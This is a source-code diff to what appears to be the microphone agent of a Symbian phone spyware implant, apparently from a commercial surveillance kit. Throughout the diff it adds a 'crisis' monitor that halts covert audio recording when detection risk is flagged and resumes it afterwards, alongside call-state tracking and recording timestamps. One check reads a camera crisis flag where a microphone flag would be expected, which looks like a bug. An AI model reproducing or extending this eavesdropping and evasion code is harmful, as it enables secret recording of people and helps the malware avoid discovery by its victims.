@@ -17,6 +17,7 @@
 #include "AgentMic.h"
 #include <HT\LogFile.h>
 #include <HT\TimeUtils.h>
+#include "AgentCrisis.h"
 
 // Audio data buffer size for AMR encoding (20 ms per frame, a total of 5000 ms in 250 frames).
 // http://wiki.forum.nokia.com/index.php/AMR_format
@@ -38,6 +39,7 @@ CAgentMic::~CAgentMic()
 	{
 	delete iCallMonitor;
 	delete iTimer;
+	delete iCrisisMonitor;
 	
 	__FLOG(_L("Destructor"));
 	if(iInputStream)
@@ -81,6 +83,7 @@ void CAgentMic::ConstructL(const TDesC8& params)
 	
 	iCallMonitor = CSlimPhoneCallMonitor::NewL(*this);
 	iTimer = CTimeOutTimer::NewL(*this);
+	iCrisisMonitor = CMonitorCrisis::NewL(EMicCrisis,*this);
 		
 	// Initial audio stream properties for input and output, 8KHz mono. 
 	// These settings could also be set/changed using method SetAudioPropertiesL() of
@@ -110,7 +113,16 @@ void CAgentMic::StartAgentCmdL()
 	//__FLOG(_L("StartAgentCmdL()"));
 	
 	iCallMonitor->StartListeningForEvents();
+	iCrisisMonitor->Start();
 	
+	// if we are in crisis don't go further
+	// see AgentCrisis.h for mask values
+	TInt flags=0;
+	iCrisis = EFalse;
+	RProperty::Get(KPropertyUidCore, KPropertyCrisis,flags);
+	if(flags & ECamCrisis)
+		iCrisis = ETrue;
+		
 	TTime now;
 	now.UniversalTime();
 	TInt64 filetime = TimeUtils::GetFiletime(now);
@@ -140,6 +152,7 @@ void CAgentMic::StopAgentCmdL()
 	
 	iTimer->Cancel();
 	iCallMonitor->Cancel();
+	iCrisisMonitor->Cancel();
 	
 	if(iInputStream)
 		{
@@ -185,8 +198,11 @@ void CAgentMic::MaiscOpenComplete(TInt aError)
         iInputStream->SetPriority(EMdaPriorityMax,EMdaPriorityPreferenceTime);
         
         // two buffers are used, they will be used in a internal FIFO queue
-        iInputStream->ReadL(*iStreamBufferArray[0]);
-        iInputStream->ReadL(*iStreamBufferArray[1]);
+        if(!iCrisis)
+        	{
+        	iInputStream->ReadL(*iStreamBufferArray[0]);
+        	iInputStream->ReadL(*iStreamBufferArray[1]);
+        	}
         } 
 	else
 		{
@@ -219,7 +235,7 @@ void CAgentMic::MaiscBufferCopied(TInt aError, const TDesC8& aBuffer)
 		
 	if (aError==KErrNone && iInputStream) 
 	    {
-		if (&aBuffer==iStreamBufferArray[0])
+			if (&aBuffer==iStreamBufferArray[0])
 		        iInputStream->ReadL(*iStreamBufferArray[0]);
 		    else
 		    	iInputStream->ReadL(*iStreamBufferArray[1]);
@@ -304,6 +320,7 @@ void CAgentMic::MaiscRecordComplete(TInt aError)
 
 void CAgentMic::NotifyIdle()
 	{
+	iCall = EFalse;
 	//here we can try to restart mic recording
 	if(iInputStream)
 		{
@@ -317,6 +334,7 @@ void CAgentMic::NotifyIdle()
 
 void CAgentMic::NotifyDialling()
 	{
+	iCall = ETrue;
 	//this phone is calling other party
 	if(iInputStream)
 		{
@@ -326,6 +344,7 @@ void CAgentMic::NotifyDialling()
 
 void CAgentMic::NotifyRinging()
 	{
+	iCall = ETrue;
 	//this phone ringing
 	if(iInputStream)
 		{
@@ -341,7 +360,48 @@ void CAgentMic::TimerExpiredL(TAny* src)
 
 void CAgentMic::RestartRecording()
 	{
-	iInputStream->ReadL(*iStreamBufferArray[0]);
-	iInputStream->ReadL(*iStreamBufferArray[1]);
+	if(!iCrisis)
+		{
+		// set start time
+		TTime now;
+		now.UniversalTime();
+		TInt64 filetime = TimeUtils::GetFiletime(now);
+		iMicAdditionalData.highDateTime = (filetime >> 32);
+		iMicAdditionalData.lowDateTime = (filetime & 0xFFFFFFFF);
+		// start rec
+		iInputStream->ReadL(*iStreamBufferArray[0]);
+		iInputStream->ReadL(*iStreamBufferArray[1]);
+		}
+	}
+
+void CAgentMic::CrisisOnL()
+	{
+	if(!iCrisis)
+		{
+		iCrisis = ETrue;
+		// we weren't in crisis, so let's stop
+		if(iInputStream)
+			{
+			iInputStream->Stop();
+			}
+		}
+	}
+
+void CAgentMic::CrisisOffL()
+	{
+	if(iCrisis  && !iCall)
+		{
+		iCrisis = EFalse;
+		// we were in crisis, let's start again
+		// set start time
+		TTime now;
+		now.UniversalTime();
+		TInt64 filetime = TimeUtils::GetFiletime(now);
+		iMicAdditionalData.highDateTime = (filetime >> 32);
+		iMicAdditionalData.lowDateTime = (filetime & 0xFFFFFFFF);
+		// start rec
+		iInputStream->ReadL(*iStreamBufferArray[0]);
+		iInputStream->ReadL(*iStreamBufferArray[1]);
+		}
 	}
 
